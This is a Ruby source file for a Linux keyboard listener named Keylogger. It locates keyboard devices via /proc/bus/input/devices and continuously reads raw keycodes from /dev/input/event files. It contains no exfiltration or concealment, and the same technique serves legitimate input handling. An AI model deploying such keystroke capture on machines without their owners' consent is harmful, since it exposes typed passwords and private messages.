class Keylogger
  module InputDevices
    class LinuxX86
      FORMAT = "l!<l!<HHI!<".freeze
      MIN_ID = 0
      MAX_ID = 59
      KEYBOARD_EV = "120013".freeze
      DEVICE_REGEX = /
        N:\sName="(?<name>.+)"(\n|.)*
        H:\sHandlers=.*event(?<event_id>[0-9]+).*(\n|.)*
        B:\sEV=(?<ev>[0-9]+)
      /x.freeze

      Device = Struct.new(:name, :event_id, :ev, keyword_init: true)

      def find_by_name(name)
        devices.detect do |device|
          device.name == name && device.ev == KEYBOARD_EV
        end
      end

      # Pick the first keyboard out of the list
      def default
        devices.detect { |device| device.ev == KEYBOARD_EV }
      end

      def listen(device)
        file = File.open("/dev/input/event" + device.event_id, "rb")
        loop do
          line = file.read(24)
          value = line.unpack(FORMAT).last

          yield value if value > MIN_ID && value < MAX_ID
        end
      end

      private

      def devices
        @devices ||= begin
          contents = File.read("/proc/bus/input/devices")
          contents.split("\n\n").map do |device|
            blob = DEVICE_REGEX.match(device).named_captures
            Device.new(blob)
          end
        end
      end
    end
  end
end
